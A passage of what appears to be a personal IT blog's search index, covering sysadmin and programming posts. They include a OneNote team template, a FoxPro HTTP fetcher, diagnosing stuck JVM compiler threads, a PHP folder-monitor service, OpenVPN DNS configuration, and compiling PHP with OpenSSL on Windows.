</li> </ul> Example Structure <p>Here\u2019s the high-level layout of the OneNote template, with a description of how each section should be used:</p> <ul> <li>Does this technology need alerting configured?</li> <li>How are the alerts received? (email, SIEM, dashboard, SMS, etc.)</li> <li>How often do they need to be created or reviewed?</li> <li>What levels of alerts do we need?</li> <ul> <li>Emergency \u2013 critical issues requiring immediate attention.</li> <li>Action \u2013 issues that require follow-up but are not urgent.</li> <li>Aware \u2013 informational alerts to maintain visibility.</li> </ul> </ul> <ul> <li>Drawing showing how the technology fits in with others.</li> <li>These do not have to be formal, enterprise-approved diagrams.</li> <li>The purpose is to help the team and new team members learn, and to serve as a reference for discussions.</li> </ul> <ul> <li>Does this technology use any certificates?</li> <li>How are they obtained and installed/implemented?</li> <li>Expiration management \u2013 how do we get alerted or know when a certificate is nearing expiration?</li> </ul> <ul> <li>Capture all licensing information.</li> <li>Keys, renewal dates, vendor instructions.</li> </ul> <ul> <li>How is logging performed?</li> <li>What information needs to be captured?</li> <li>Does the logging information need to be sent somewhere? (e.g., SIEM, centralized log store, monitoring platform)</li> </ul> <ul> <li>Meetings worth keeping and sharing with team members.</li> <li>Use subpages like <code>202X-04-XX</code> for dated notes.</li> </ul> <ul> <li>Who owns the technology and who uses it.</li> <li>Great for clarifying responsibility.</li> </ul> <ul> <li>Good for new people.</li> <li>Step-by-step how-tos for daily/weekly requests.</li> </ul> <ul> <li>What needs to be reported on this technology?</li> <li>How does the reporting get implemented? (dashboards, scheduled reports, automated exports, etc.)</li> </ul> <ul> <li>These are mini projects you work on for that technology.</li> <li>Examples: making a change, enabling a new feature, testing a configuration, or rolling out a small initiative.</li> <li>Great for documenting the steps so they can be reused or referenced in the future.</li> </ul> <ul> <li>This is where we keep the \u201chow-to\u201d documentation for using that technology.</li> <li>If the technology is large and has multiple sections or modules, break them out into separate groups:</li> <ul> <li>tn \u2013 Module Name 01</li> <li>tn \u2013 Module Name 02</li> </ul> <li>Each header page organizes its module, and subpages under it hold the details.</li> <li>See \u201cProofpoint\u201d as a good example.</li> <li>The subpages in this group/template are just examples \u2014 adapt them to fit your team\u2019s needs.</li> </ul> <ul> <li>Capture training materials, summaries, and lessons learned.</li> <li>Notes that will benefit teammates in the future.</li> </ul> <ul> <li>Anytime something happens, record it here.</li> <li>Excellent for building a learning archive for the whole team.</li> </ul> <ul> <li>Log of upgrades to the technology.</li> <li>Include dates, versions, steps taken, and lessons learned.</li> </ul> <ul> <li>Vendor contact information and links to official documentation.</li> <li>Useful for support cases and escalation.</li> </ul> <ul> <li>Place any old pages here to keep the main notebook clean.</li> <li>Keeps a history without clutter.</li> </ul>","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/EngTeamTemplate/#how-to-use-the-template","title":"How to Use the Template","text":"<ol> <li>Clone the structure into your team\u2019s OneNote notebook.  </li> <li>Encourage consistency: everyone places notes in the right section.  </li> <li>Use subpages for specifics: each incident, upgrade, or meeting gets its own page.  </li> <li>Archive regularly: move old content to keep the main sections tidy.   </li> </ol>","tags":["OneNote","Teamwork","Organization"]},{"location":"posts/GetHtml/","title":"GetHtml","text":"<p>Published: 2006-12-15</p> <p>After experimenting with the West Wind Internet and Client Tools and then with my own version of a wininet.dll wrapper, I decided the easiest way was to use the WinHTTP service. I didn't even know it existed until I found it on Calvin Hsia's Weblog.</p> <p>Below is the main code of the application. Look at the links provided in the readme for more information on the oHTTP object instantiated in the code.</p> <pre><code>Thisform.MousePointer = 11\nTry\n    Local oHTTP As \"winhttp.winhttprequest.5.1\"\n\n    oHTTP=Newobject(\"winhttp.winhttprequest.5.1\")\n    oHTTP.Open(\"GET\",Trim(Thisform.txtUrl.Value),.F.)\n    oHTTP.Option(4) = 13056 &amp;&amp; Ignore ssl errors\n\n    &amp;&amp; Lets look like IE\n    oHTTP.SetRequestHeader(\"user-agent\", ;\n        \"Mozilla/4.0 (compatible; MSIE 6.0; Windows ;\n        NT 5.2; .NET CLR 1.0.3705;)\")\n\n    oHTTP.Send()\n\n    Thisform.txtHtml.Value = oHTTP.ResponseText\n    Thisform.txtHeaders.Value = oHTTP.GetAllResponseHeaders\n\nCatch To ex\n        Thisform.txtHtml.Value = ex.Message\nFinally\n        Thisform.MousePointer = 0\nEndtry\n</code></pre>","tags":["FoxPro","WinHTTP"]},{"location":"posts/JvmStuckThread/","title":"Jvm Stuck Threads","text":"<p>Published: 2025-01-26</p>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#symptom","title":"Symptom","text":"<p>On a Tomcat/JVM application designed to run as multiple instances across several servers behind a load balancer, we noticed an issue after monthly patching. Following server and application restarts, a few days would pass before certain instances began exhibiting unusually high CPU usage at random.</p> <p>Typically, each application instance on a single server would operate within a CPU usage range of less than 1% to 2%, with occasional spikes during expected application activity\u2014normal behavior for Windows applications and executables. However, after patching, we observed instances becoming 'stuck' at around 25% CPU usage.</p> <p></p>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#detailed-view","title":"Detailed View","text":"<p>The screenshot below highlights the Tomcat process (ID 5732) and one of its threads (ID 5984). The significantly higher CPU time indicates that the thread had been stuck at this usage level for an extended period and, as our testing confirmed, it would remain in this state indefinitely.</p> <p></p>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#more-information","title":"More Information","text":"","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#powershell-monitoring","title":"PowerShell Monitoring","text":"<p>To gain a better understanding of why, it was important to determine when. For this, a PowerShell script was written using WMI to monitor when these threads would become 'stuck'.</p> <p>A more complete code for this can be found here: Thread Monitor</p> <pre><code># Get all Tomcast threads that are over 95% processor time ( this includes the parent process id)\n\"SELECT * \"\n\"FROM Win32_PerfFormattedData_PerfProc_Thread \"\n\"WHERE PercentProcessorTime &gt; 95 AND Name LIKE '%Tomcat%'\"\n\n# Get the command line for the process id to identify the instance\n\"SELECT CommandLine \"\n\"FROM Win32_Process \"\n\"WHERE ProcessId = $processId\"\n\n#SAMPLE DATA CAPTURE\n\nStart time: 20240508070002\nStart time: 20240508073003\nStart time: 20240508080003\nStart time: 20240508083003\nStart time: 20240508090003\nStart time: 20240508093003\nStart time: 20240508100003\nStart time: 20240508103003\nStart time: 20240508110003 Instance: Instance25 t-CPU %: 99 \nStart time: 20240508113003 Instance: Instance25 t-CPU %: 100 \nStart time: 20240508120003 Instance: Instance25 t-CPU %: 100 \nStart time: 20240508123003 Instance: Instance25 t-CPU %: 99 \nStart time: 20240508130003 Instance: Instance25 t-CPU %: 100 \nStart time: 20240508133003 Instance: Instance25 t-CPU %: 100 \nStart time: 20240508140003 Instance: Instance25 t-CPU %: 98 \nStart time: 20240508143003 Instance: Instance25 t-CPU %: 99\nStart time: 20240508150003 Instance: Instance25 t-CPU %: 98\nStart time: 20240508153003 Instance: Instance25 t-CPU %: 101\n</code></pre>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#thread-information","title":"Thread Information","text":"<p>Digging deeper we needed to understand what the thread within the Tomcat process was doing. For this we used a tool called <code>jstack</code> to get a thread dump of the exe.</p> <p>With an ID of 5732 the command looked something like this:</p> <pre><code>C:\\Program Files\\Java\\jdk1.8.0_281\\bin&gt;jstack -l 5732 &gt;&gt; \"c:\\Users\\&lt;username&gt;\\Desktop\\threadinfo.txt\"\n</code></pre> <p>Sample output of <code>jstack</code>:</p> <pre><code>\"main\" #1 prio=5 os_prio=0 tid=0x00007f9c28001000 nid=0x1f03 waiting on condition [0x00007f9c28fef000]\n   java.lang.Thread.State: TIMED_WAITING (sleeping)\n        at java.lang.Thread.sleep(Native Method)\n        at com.example.MyClass.run(MyClass.java:42)\n        at java.lang.Thread.run(Thread.java:748)\n\n\"Thread-1\" #2 prio=5 os_prio=0 tid=0x00007f9c28002000 nid=0x1f04 runnable [0x00007f9c28ff0000]\n   java.lang.Thread.State: RUNNABLE\n        at java.io.FileInputStream.readBytes(Native Method)\n        at java.io.FileInputStream.read(FileInputStream.java:255)\n</code></pre>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#the-native-id","title":"The Native ID","text":"<p>Looking through the output of <code>jstack</code> we saw all the threads, but to determine which was the one running the CPU core to 100%, we needed to convert the nid or Native ID from hex to decimal.</p> <p>This was done by taking all the nid's and using Excel to convert them all at once.</p> <p>Eventually, we determined that nid 0x1760 corresponded to thread id 5984. The stuck thread was a C2 compiler thread.</p> <pre><code>\"C2 CompilerThread1\" #7 daemon prio=9 os_prio=2 tid=0x000000001561f800 nid=0x1760 runnable [0x0000000000000000]\n   java.lang.Thread.State: RUNNABLE\n</code></pre>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#problem","title":"Problem","text":"","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#what-is-a-c2-compiler","title":"What Is A C2 Compiler?","text":"<p>The C2 compiler, also known as the Java HotSpot Server Compiler, is one of the Just-In-Time (JIT) compilers used in the Java Virtual Machine (JVM). It is designed to compile Java bytecode into highly optimized native machine code to maximize performance during runtime.</p> <p>The JVM decides when to compile code based on runtime profiling data collected about the behavior of the application. This decision-making process revolves around the concept of <code>hotspots</code>, where the JVM identifies methods or code paths that are executed frequently or are performance-critical.</p>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#something-in-the-code","title":"Something In The Code","text":"<p>There must be something (hotspot code) within the application source that causes the compiler to hang when it tries to optimize it further. </p>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#a-solution","title":"A Solution","text":"","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#how-the-app-is-started","title":"How The App Is Started","text":"<p>The Java Virtual Machine (JVM) has a wide range of parameters that allow control of its behavior. From memory management, to garbage collection, debugging, and many other settings to fine-tune performance.</p> <p>Here is a sample:</p> <pre><code>-Dcatalina.base=D:\\Instance00\n-Dcatalina.home=D:\\Tomcat8.0.47\n-Djava.endorsed.dirs=D:\\Tomcat8.0.47\\endorsed\n-Djava.io.tmpdir=D:\\Instance00\\temp\n-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager\n-Djava.util.logging.config.file=D:\\Tomcat8.0.47\\conf\\logging.properties\n-Xmx1536m\n-Xms256m\n-Xmn100m\n-XX:+HeapDumpOnOutOfMemoryError\n-XX:HeapDumpPath=D:\\Instance00\\logs\\java_pid.hprof\n-XX:ParallelGCThreads=4\n-XX:+UseParallelGC\n-XX:SurvivorRatio=8\n-XX:TargetSurvivorRatio=75\n-XX:MaxTenuringThreshold=15\n</code></pre>","tags":["java","jvm","tomcat"]},{"location":"posts/JvmStuckThread/#skip-c2-compilation","title":"Skip C2 compilation","text":"<p>The ideal solution would be to try and determine what exactly is causing the hangup and exclude it from compilation. It can be time consuming and difficult to trace down to the exact code. However, if the offending item can be determined it can be excluded from optimization by using a startup parameter string similar to the one outlined below.</p> <p><code>XX:CompileCommand=exclude,com.graphhopper.coll.GHLongIntBTree::put</code></p> <p>Other options include limiting or disabling aggressive optimizations, reducing the number of active JIT compilation threads, limiting method inlining, or turnning off C2 compilation all together.</p> <p>In this particular instance we chose to turn off C2 compilation. Since there are multiple levels and the thread dump never showed C1 compiler threads getting stuck, we felt that full C1 compilation was enough and easy to test and implement. </p> <p>The levels of compilation are as follows:</p> <ul> <li>0 Interpreted code</li> <li>1 Simple C1 compiled code</li> <li>2 Limited C1 compiled code</li> <li>3 Full C1 compiled code</li> <li>4 C2 compiled code</li> </ul> <p>After months of testing and piloting on a few chosen production instances and verifing no ill effects to the end-user, we were confident in our solution, and implemented it on all our instances.</p> <p>By using the <code>-XX:TieredStopAtLevel=3</code> parameter we were able to stop JIT compilation at level 3 and continued monitoring showed no stuck threads and the application runtime was more stable.</p>","tags":["java","jvm","tomcat"]},{"location":"posts/LblPrint/","title":"LblPrint","text":"<p>Published: 2008-03-13</p> <p>Note</p> <p>The code for this program is not available.</p> <p></p> <p>User enters a search term, then clicks the search button. The program connects to the Sql Server 2000 database, retrieves the data, and populates the data grid. The user then selects the record desired and the label preview is generated. </p> <p>On every record selection the preview is automatically generated. The user can then select a modifier by clicking on one of the radio buttons to the right of the preview container. On each change of the modifier the preview is automatically updated as well. </p> <p>When the label is ready, the user clicks the print button and the label is sent to the  printer and the cursor is automatically placed in the search box.</p> <p>Prior to printing, the user can can select the desired printer and paper size using the Print Setup button. </p> <p>Being able to select or change printer settings is very important because some of the users use this application through a terminal server session. The label printer is attached to their local workstation and gets mapped from the terminal server back to their PC when they log on. Since the name of the printer is not known until after login, it would be difficult to hardcode the printer in the report file. Once the settings are changed, they are saved in the lbx file until the next time it needs to be updated.</p> <p>For more information on the reporting capabilities of VFP 9, please check out this great article:</p> <p>Techniques for an alternative Report Preview UI</p> <p>Also, take a look at the SYS(1037) function in the FoxPro help file.</p> <p></p>","tags":["FoxPro"]},{"location":"posts/MonitorFolderService/","title":"Monitor Folder With PHP","text":"<p>Published: 2009-10-16</p> <p>At the office we use a RICOH Aficio 1045 Copier. One of the features of this copier is that it also doubles as a scanner. To scan a document an employee goes to the copier, puts the copier in scanner mode, selects their mailbox from a list and then scans the document. The scanner then sends the scanned information to the scanner software running on one of our servers where the actual file is created and placed in the user's virtual mailbox. (We use pdf as the default.) </p> <p>Each user's virtual mailbox has a folder associated with it, and this folder is located in each user's personal folder on the server. Most of our employees have workstations and their \"My Documents\" folder is mapped to their personal folder on the server. By the time they get back to their desk, all they have to do is go into their \"My Documents\" folder and the scanned document is already there. </p> <p>The problem is with notebook users who don't have a mapped \"My Documents\". If it were mapped, they would not be able to take their documents with them whenever they left the office. So, how can notebook users also retrieve their scanned documents from their \"My Documents\" folder? </p> <p>Basically, all that is needed is some kind of mechanism to monitor a user's virtual mailbox, and when a new file is placed there, copy it down to the user's \"My Documents\" folder on the notebook. </p> <p>PHP Solution:</p> <p>Install PHP on your server/workstation that will be used to run this. (Google \"PHP Install\" for more info...) Php doesn't have a built in way of creating Windows services, hence the \"almost\" in the title. So you can use two nice utilities called INSTSRV.EXE and SRVANY.EXE that come with the Windows Resource Kit. </p> <p>You can download it from here: Windows 2003 Resource Kit Tools </p> <p>Once you've installed the kit you can use something similar to the following to install the service.</p> <pre><code>C:\\Program Files\\Windows Resource Kits\\Tools&gt;instsrv scansmon \"d:\\Program Files\\Windows Resource Kits\\Tools\\srvany.exe\"\n</code></pre> <p>SRVANY does all the work and Windows sees it as the service. SRVANY will look in the registry for the EXE file to use for the service. The EXE name, the starting directory, and any optional parameters should be in the registry as follows:</p> <pre><code>[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\\nServices\\scansmon\\Parameters]\n\"AppDirectory\"=\"D:\\\\Scripts\\\\Scansmon\"\n\"Application\"=\"php -q D:\\\\Scripts\\\\Scansmon\\\\scansmon.php3\"\n\"AppParameters\"=\"\"\n</code></pre> <p>NOTE: You can copy/paste the lines above to a file named scansmon.reg (change the paths as necessary and make sure to include the double back-slashes) and double click the .reg file to add these entries to the registry. Php itself is the EXE that it runs. scansmon.php3 has the following code in it. (you will need to modify it for your network)</p> <pre><code>&lt;?php\nset_time_limit(0);\n\n$user_a_user_directory = '\\\\\\\\Server01\\\\user\\\\user_a\\\\ScansIn\\\\';\n$user_a_notebook_scans_directory = '\\\\\\\\user_a_notebook\\\\c$\\\\Documents and Settings\\\\user_a\\\\My Documents\\\\Scans\\\\';\n\n$user_b_user_directory = '\\\\\\\\Server01\\\\user\\\\user_b\\\\ScansIn\\\\';\n$user_b_notebook_scans_directory = '\\\\\\\\user_b_notebook\\\\c$\\\\Documents and Settings\\\\user_a\\\\My Documents\\\\Scans\\\\';\n\n$loop = true;\n\nwhile($loop){ //Will run as a windows service so loop infinitely\n    $log_file = date(\"Ymd\").\".txt\";\n\n    writetolog(\"****************\", $log_file);\n    try{\n        if (file_exists($user_a_user_directory) &amp;&amp; file_exists($user_a_notebook_scans_directory)){\n            writetolog(\"Ready to proceed with user_a scans...\", $log_file);\n\n            $oldfile = \"\";\n            $newfile = \"\";\n\n            if ($dir = opendir($user_a_user_directory)){\n                while ($file = readdir($dir)){ //As long as there are files copy them and write to log\n                    $oldfile = $user_a_user_directory.$file;\n                    if (is_file($oldfile)){ //&amp;&amp; substr($file, -4) == '.pdf'\n                        $newfile = $user_a_notebook_scans_directory.$file;\n                        writetolog(\"copying $file\", $log_file);\n                        if (!copy($oldfile, $newfile)){\n                            writetolog(\"failed to copy $oldfile...\", $log_file);\n                        }else{\n                            unlink($oldfile);\n                            writetolog(\"deleted $oldfile...\", $log_file);\n                        }\n                    }\n                }\n                closedir($dir);\n            } \n        }else{\n            writetolog(\"Can't do user_a scans...\", $log_file);\n        }\n\n        if (file_exists($user_b_user_directory) &amp;&amp; file_exists($user_b_notebook_scans_directory)){\n            writetolog(\"Ready to proceed we user_b scans...\", $log_file);\n\n            $oldfile = \"\";\n            $newfile = \"\";\n\n            if ($dir = opendir($user_b_user_directory)){\n                while ($file = readdir($dir)){\n                    $oldfile = $user_b_user_directory.$file;\n                    if (is_file($oldfile)){ //&amp;&amp; substr($file, -4) == '.pdf'\n                        $newfile = $user_b_notebook_scans_directory.$file;\n                        writetolog(\"copying $file\", $log_file);\n                        if (!copy($oldfile, $newfile)){\n                            writetolog(\"failed to copy $oldfile...\", $log_file);\n                        }else{\n                            unlink($oldfile);\n                            writetolog(\"deleted $oldfile...\", $log_file);\n                        }\n                    }\n                }\n                closedir($dir);\n            } \n        }else{\n            writetolog(\"Can't do user_b scans...\", $log_file);\n        }\n\n        writetolog(\"Waiting for 180 seconds...\", $log_file);\n        Sleep(180); //Wait three minutes before next check\n    }\n    catch(Exception $e){\n        $loop = false;\n        writetolog($e-&gt;getMessage(), $log_file);\n    }\n}\n\nfunction writetolog($text, $file)\n{\n    $log_directory = 'D:\\\\Logs\\\\Scripts\\\\';\n    $log_file = $log_directory.$file;\n    $fh = fopen($log_file, 'a');\n    fwrite($fh, date(\"h:i:s A\").\"  $text\".chr(13).chr(10));\n    fclose($fh);\n}\n?&gt;\n</code></pre>","tags":["PHP"]},{"location":"posts/OpenVPNDNS/","title":"Make OpenVPN DNS Work","text":"<p>Published: 2022-09-03</p> <p>With the OpenVPN terminal client...</p> <p>If your .ovpn config file does not include the UP and DOWN scripts to interact with Systemd, your DNS resolution into the VPN network may not work correctly.</p> <p>One would think that adding the option <code>dhcp-option DOMAIN &lt;yourdomain.com&gt;</code> to the config file is enough to query the VPN's DNS server(s) for the specified domain, but unfortunataly that is not the case. </p> <p>Before adding scripts to the config file, ensure the package is installed:</p> <p><code>sudo apt search openvpn-systemd-resolved</code> </p> <p>should look something like:</p> <p></p> <p>Domains that need to be queried on the VPN's DNS servers can be pushed, but you can also add them manually.</p> <pre><code># these domains need to resolve with the vpn dns server\ndhcp-option DOMAIN &lt;domain&gt;\n\n# tell systemd-resolved to update for the above \nscript-security 2\nsetenv PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nup /etc/openvpn/update-systemd-resolved\nup-restart\ndown /etc/openvpn/update-systemd-resolved\ndown-pre\n</code></pre> <p>After successful connection to the VPN server, you can check DNS resolution by running `resolvectl status'. It will show which servers are used for which domains.</p> <p>force dns to vpn dns servers <pre><code>#force dns to vpn dns servers\ndhcp-option DOMAIN-ROUTE .\ndhcp-option DNS &lt;vpn dns server ip&gt;\ndhcp-option DNS 10.0.0.1 \n\n#may be needed in some cases to force all traffic as well\nredirect-gateway def1 bypass-dhcp\n</code></pre></p>","tags":["OpenVPN","Linux"]},{"location":"posts/OpenVPNDNS/#useful-links","title":"Useful Links","text":"<ul> <li>openvpn-dhcp-option-dns-not-working</li> <li>update-systemd-resolved</li> <li>systemd-resolved-not-querying-dns-server-set-by-openvpn</li> </ul>","tags":["OpenVPN","Linux"]},{"location":"posts/PHPFtpBackupTool/","title":"PHP Ftp Backup Library","text":"<p>Published: 2007-10-23</p> <p> Git Repository</p> <p>UPDATE 2019-11-07: Tool used for work many years ago. At that time there weren't many good options to small companies for off-site backups. This tool allowed our critical files to be automatically sent off-site on a nightly basis. Things have come a long way since then!</p> <p>Here is an example of how to use this library: <pre><code>&lt;?php\nrequire_once('Iat/Ftp/Backup.php');\n\n$ftpBu = new Iat_Ftp_Backup();\n\n$ftpBu-&gt;logFileFullName =\n    'c:\\\\documents and settings\\\\user\\\\desktop\\\\phpftpbackup\\\\'.\n    date('Ymd').'.txt';\n\n$ftpBu-&gt;ftpServer           = 'ftp.serveraddress.com';\n$ftpBu-&gt;ftpPort             = 21;\n\n$ftpBu-&gt;ftpUserName         = 'username';\n$ftpBu-&gt;ftpUserPass         = 'password';\n\n$ftpBu-&gt;ftpUsePasv          = true;\n$ftpBu-&gt;ftpUseSSL           = true;\n\n$ftpBu-&gt;logEnabled          = true;\n$ftpBu-&gt;logToScreen         = true;\n\n$ftpBu-&gt;dataPreviewOnly     = true;\n\n$ftpBu-&gt;remoteDirFullName   = '/dbs/';\n$ftpBu-&gt;localDirFullName    = '\\\\\\\\server\\\\backups\\\\';\n\n$ftpBu-&gt;runBackup();\n?&gt;\n</code></pre></p>","tags":["PHP"]},{"location":"posts/PHPImageMailer/","title":"Image Mailer","text":"<p>Published: 2009-04-03</p> <p> Git Repository</p> <p>Small utility to easily email photos with Microsoft Outlook. Basically, it allows you to embed images in the body of the email message, so it's easier for the recipient to view the files.</p> <p>To use the program, simply highlight the photos you wish to send, then right-click one of the highlighted images and select \"Send-To\" then \"Image Mailer for Outlook\". </p> <p>Image Mailer will resize the images to an appropriate size for e-mailing and then automatically create the e-mail for you with the images embedded in the body of the message.</p> <p>If you wish to change settings, like how large the image is when it's in the body of the message, you can use the settings editor included. Click on Start --&gt; All Programs --&gt; Deciacco.com --&gt; Image Mailer, and  then Settings.</p> <p>There are three basic settings to choose from. The best settings for most people will be selected by default, but you may choose something to better fit your needs.</p>","tags":["PHP"]},{"location":"posts/PHPImageResizer/","title":"Image Resizer","text":"<p>Published: 2008-04-03</p> <p> Git Repository</p> <p>Small utility to quickly and easily resize images. Written in PHP, and while PHP is mostly a \"Web\" language, it actually worked out quite nicely.</p> <p>You simply right-click an image or a folder containing images and select the appropriate command. Currently, the program supports JPEG, GIF, and PNG images.</p> <p>The original image remains intact as a new, resized version is created.</p> <p>Installing</p> <p>You can simply download the installer and run it on your computer. After the install, you will have an Image Resizer folder in your Start Menu as well as some new context menu (right-click) entries.</p> <p>Launching</p> <p>To start the program simply right-click on an image file and select \"Resize Image\". If you want to resize multiple files, right-click on the folder containing the images and select \"Run Image Resizer On\".</p> <p>Program Settings</p> <p>When you launch Image Resizer, it needs some information from you. You can specify this information in one of two ways:</p> <ul> <li> <p>First, you can run it in interactive mode, where it will require you to input the settings every time. This is good when you require different image sizes often.</p> </li> <li> <p>Second, you can run Image Resizer in silent mode where you predefine the settings in the settings file. (The settings file is located in the program directory and shortcut to it is created in the program group in the Start Menu.) This is especially useful if you use Image Resizer to resize images before you send them in an email.</p> </li> </ul> <p>Below are the required entries:</p> <ol> <li>Target Size<ul> <li>The maximum height or width in pixels the re-sized image can be. The aspect ratio will not change, therefore whichever side of the image is the longest will need to be the side to fit within the target size.</li> </ul> </li> <li>Resized Image Postfix<ul> <li>Something to append to the end of the re-sized file's name.</li> <li>Example: By taking the default value of \"_resized\", the image \"silvesterkitty.jpg\" will be copied and resized to \"silvesterkitty_resized.jpg\".</li> </ul> </li> <li>Quality<ul> <li>The quality of the resized image. The higher the quality means the less atifacting will occure on the image and the final result is a more crisp looking image at the cost of higher file size.</li> </ul> </li> </ol> <p>*Note: To run image resizer in Silent mode, open the settings file and set \"Silent\" equal to 1.</p> <p>**Note: Image Resizer always reads the values from the settings file, whether in interactive or silent mode. If in interactive mode, the values from the settings are used as the defaults.</p> <p>Uninstalling</p> <p>To uninstall, use the Windows uninstall utility from the control panel. All files, shortcuts, and registry entries are removed.</p> <p>Revision History</p> <ul> <li>0.1.3 - 03/03/2009</li> <li>added the ability to run on a single file or by selecting multiple files</li> <li>removed the ability to drag and drop; not needed as right-click is sufficient</li> <li>removed the launch icon from the start menu</li> <li>renamed the ini file shortcut in the program group to make more sense</li> <li>added documentation to the settings file</li> <li>fixed bug in installer when installing on Vista 32bit that caused the wrong registry entry to be installed which in turn caused the program to not lauch from the context menu</li> <li>0.1.2 - 02/16/2009</li> <li>added installer</li> <li>changed the resizing algorithm</li> <li>no longer uses width and height, but uses a target size</li> <li>0.1.1 - 04/03/2008</li> <li>cleaned up the registry entry to launch the php file itself instead of cmd.exe</li> <li>the \"Run Image Resizer On\" context menu extension does not show when right-clicking the Recycle Bin</li> </ul>","tags":["PHP"]},{"location":"posts/PHPOpenSSL/","title":"PHP, OpenSSL and ftp_ssl_connect() on Win32","text":"<p>Published: 2007-10-12</p> <p>For quite some time I've been wanting to compile PHP for the sole purpose of using the http://us.php.net/ftp_ssl_connect function.</p> <p>According to the PHP manual:</p>  ftp_ssl_connect() is only available if OpenSSL support is enabled into your version of PHP. If it's undefined and you've compiled FTP support then this is why. For Windows you must compile your own PHP binaries to support this function.  <p>When I first saw this I was disappointed.  I thought I would never be able to compile PHP myself. It just felt like a daunting task to get my system configured correctly.</p> <p>...Well, it's not perfect, but I have been able to get it to work, and I've even been able to patch up the PHP code itself!</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#part-1-compiling-php","title":"PART 1 - COMPILING PHP","text":"<p>UPDATE: 2010-05-27 - Please see this link for compiling on http://wiki.php.net/internals/windows/stepbystepbuild</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#install-visual-c-6-visual-c-express-or-visual-studio-2005-are-ok-too","title":"Install Visual C++ 6 (Visual C++ Express OR Visual Studio 2005 are OK too)","text":"<p>Luckily I already had a copy of C++ 6 left over from my college days. Only problem I had was to find the cd. With some minor changes this will also work for VC++ Express/Visual Studio 2005. I chose to use version 6 because using the newer versions requires you distribute other files along with PHP. If all you have is VCE or VS2k5 go ahead and work with that, I will show you where the differences are.</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#download-php-52-source","title":"Download PHP 5.2 Source","text":"<p>The sources from the PHP snapshots worked for me. I downloaded php-5.2-dev (tar.gz) (8.9M) at the time of this writing. Link to the snapshots page: http://snaps.php.net/</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#download-needed-libraries","title":"Download Needed Libraries","text":"<p>From what I've been able to find, Edin Kadriba\u0161ic seems to have a nice zip file with everything in it. I downloaded zip.zip from his site. Link to Edin's files: http://files.edin.dk/</p> <p>You need to go into subfolder <code>/php/win32</code> and click on zip.zip. (If this link is down try this one: http://perisama.net/ )</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#create-a-working-directory","title":"Create a Working Directory","text":"<p>I did the following:</p> <ul> <li>Created directory <code>c:\\work\\</code></li> <li>Extracted source to <code>c:\\work\\php5\\</code></li> <li>Extracted php_build from zip.zip to <code>c:\\work\\php_build\\</code></li> </ul> <p>This is what it looked like after this step: <pre><code>c:\\work\n|---php5\n|---php_build\n</code></pre></p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#set-environment-variables","title":"Set Environment Variables","text":"","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#version-6","title":"Version 6:","text":"<p>I added these lines to <code>C:\\Program Files\\Microsoft Visual Studio\\VC98\\Bin\\vcvars32.bat</code>.</p> <pre><code>set PATH=%PATH%;C:\\work\\php_build\\bin;\nset BISON_SIMPLE=C:\\work\\php_build\\bin\\bison.simple\n%SystemRoot%\\system32\\cmd.exe &lt;-- Makes things a little easier, but it's not required.\n</code></pre>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#versions-6","title":"Versions &gt; 6:","text":"<p>Add the first two lines above to <code>C:\\Program Files\\Microsoft Visual Studio 8\\Common7\\Tools\\vsvars32.bat</code>.  </p> <p>I put them under the line starting</p> <pre><code> @set LIBPATH=C:\\WINDOWS\\Microsoft.NET.\n</code></pre>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#open-up-a-command-prompt","title":"Open Up a Command Prompt","text":"","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#version-6_1","title":"Version 6:","text":"<p>I created a shortcut to the <code>vcvars32.bat</code> file and whenever I needed to get into the development environment with the proper variables set, I simply double clicked it to launch a command window. (That is what the third line above is for.)</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#versions-6_1","title":"Versions &gt; 6:","text":"<p>There should be a shortcut  created with your install. For Visual Studio 2005 there is shortcut named Visual Studio 2005 Command Prompt.</p>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#switch-to-the-php-source-directory","title":"Switch to the PHP Source Directory","text":"<p>Basically, this command at the prompt assuming you have the same directory structure:</p> <pre><code>cd /d c:\\work\\php5\n</code></pre>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#run-buildconf","title":"Run Buildconf","text":"<p>This command at the prompt:</p> <pre><code>C:\\work\\php5&gt;buildconf\n</code></pre>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#run-configurejs","title":"Run Configure.js","text":"<p>PHP configuration line. More information http://us2.php.net/configure</p> <p>This command at the prompt:</p> <pre><code>C:\\work\\php5&gt; cscript /nologo configure.js --with-openssl\n</code></pre>","tags":["PHP","OpenSSL","C","Programming"]},{"location":"posts/PHPOpenSSL/#run-nmake","title":"Run nmake","text":"<p>This command at the prompt:</p> <pre><code>C:\\work\\php5&gt; nmake\n</code></pre> <p>This part takes a little while depending on 